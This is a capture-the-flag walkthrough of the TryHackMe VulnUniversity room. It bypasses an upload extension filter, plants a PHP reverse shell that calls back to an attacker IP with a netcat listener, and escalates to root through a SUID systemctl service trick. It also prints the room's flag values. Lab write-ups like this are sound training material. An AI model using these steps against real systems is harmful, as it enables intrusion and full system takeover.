# VulnUniversity — TryHackMe

**Difficulty:** Easy  
**Platform:** TryHackMe  
**Date:** June 15, 2026

---

## What's this room about?

VulnUniversity is a beginner-friendly room that walks you through a pretty realistic attack chain — scan a box, find a web app, exploit a file upload, get a shell, then escalate to root using a misconfigured SUID binary. Good room to practice the basics.

---

## Tools used

- `nmap`
- `gobuster`
- Burp Suite (Intruder)
- netcat
- PentestMonkey PHP reverse shell

---

## Walkthrough

### 1. Scanning the target

Started with a basic nmap scan to see what's running:

```bash
nmap -sV <target-ip>
```

![nmap initial scan](screenshots/01-nmap-initial-scan.png)

![nmap results](screenshots/02-nmap-scan-results.png)

![nmap details](screenshots/03-nmap-scan-details.png)

![nmap complete](screenshots/04-nmap-scan-complete.png)

Got back 6 open ports:

```
21   - FTP   (vsftpd 3.0.5)
22   - SSH   (OpenSSH 8.2p1)
139  - Samba
445  - Samba
3128 - Squid proxy
3333 - Apache 2.4.41
```

Port 3333 is where the web server is. Non-standard port, so easy to miss if you're not doing a proper version scan.

---

### 2. Finding hidden directories

Ran gobuster against the web server on 3333:

```bash
gobuster dir -u http://<target-ip>:3333 -w /usr/share/wordlists/dirb/common.txt
```

![gobuster running](screenshots/05-gobuster-scan.png)

![gobuster running 2](screenshots/06-gobuster-scan-2.png)

![gobuster results](screenshots/07-gobuster-results.png)

![gobuster done](screenshots/08-gobuster-findings.png)

Found a `/internal` directory — this turned out to be a file upload page.

---

### 3. The upload page

Went to `http://<target-ip>:3333/internal/` and found a form to upload files.

![internal upload page](screenshots/09-web-internal-page.png)

Tried uploading a `.php` file and got "Extension not allowed". So there's a filter, but these are usually bypassable. Time for Burp.

---

### 4. Bypassing the file upload filter with Burp

Intercepted the upload request, sent it to Intruder, and fuzzed the file extension to see what gets through. Used this list: `.php .php3 .php4 .php5 .phtml`

![burp intruder results](screenshots/10-burp-intercept.png)

![extension testing](screenshots/11-extension-testing.png)

Looking at response lengths — `.phtml` came back with a different length than the blocked ones, which means it was accepted. Confirmed.

![phtml accepted](screenshots/12-phtml-accepted.png)

---

### 5. Getting a shell

Grabbed the PentestMonkey PHP reverse shell, renamed it to `.phtml`, and changed the IP/port to point back to my machine:

```php
$ip = '<attacker-ip>';
$port = 1234;
```

Set up a listener:

```bash
nc -lvnp 1234
```

Uploaded the shell through `/internal`, then navigated to:

```
http://<target-ip>:3333/internal/uploads/php-reverse-shell.phtml
```

![reverse shell upload](screenshots/13-reverse-shell-upload.png)

![nc listener](screenshots/14-nc-listener.png)

![shell landed](screenshots/15-shell-obtained.png)

Got a shell back as `www-data`. Stabilised it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![shell stable](screenshots/16-shell-enumeration.png)

---

### 6. User flag

Checked `/etc/passwd` for users, saw `bill` had a home directory. Went there:

```bash
cat /home/bill/user.txt
```

![user flag](screenshots/17-user-flag.png)

**User flag: `8bd7992fbe8a6ad22a63361004cfcedb`**

---

### 7. Privilege escalation

Looked for SUID binaries:

```bash
find / -perm /4000 2>/dev/null
```

![suid enumeration](screenshots/18-suid-enumeration.png)

![systemctl suid](screenshots/19-systemctl-suid.png)

`/bin/systemctl` had the SUID bit set — that's not normal at all. Checked GTFOBins and it has a listed exploit for exactly this.

The idea: create a temporary systemd service that runs `chmod u+s /bin/bash` as root, then use `bash -p` to get a root shell.

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $(basename $TF)
/bin/systemctl start $(basename $TF)
```

![privesc service](screenshots/20-privesc-service.png)

Checked `/bin/bash` — the `s` bit is now set:

```bash
ls -l /bin/bash
# -rwsr-xr-x 1 root root ...
```

![bash suid](screenshots/21-suid-bash.png)

---

### 8. Root

```bash
/bin/bash -p
whoami
# root
```

![root shell](screenshots/22-root-shell.png)

```bash
cat /root/root.txt
```

![root flag](screenshots/23-root-flag.png)

**Root flag: `a58ff8579f0a9270368d33a9966c7fd5`**

---

### Done

![room complete](screenshots/24-post-exploit.png)

---

## Flags

| Flag | Value |
|---|---|
| User | `8bd7992fbe8a6ad22a63361004cfcedb` |
| Root | `a58ff8579f0a9270368d33a9966c7fd5` |

---

## Key takeaways

- Always scan with `-sV`, services on weird ports are easy to miss
- File upload filters based on extension blacklists are weak — `.phtml` runs as PHP on Apache
- SUID on `systemctl` is a massive misconfiguration, check GTFOBins whenever you find unusual SUID binaries
- Stabilise your shell before doing anything, raw netcat shells are painful to work with

---

## Resources

- [GTFOBins - systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [TryHackMe Room](https://tryhackme.com/room/vulnversity)
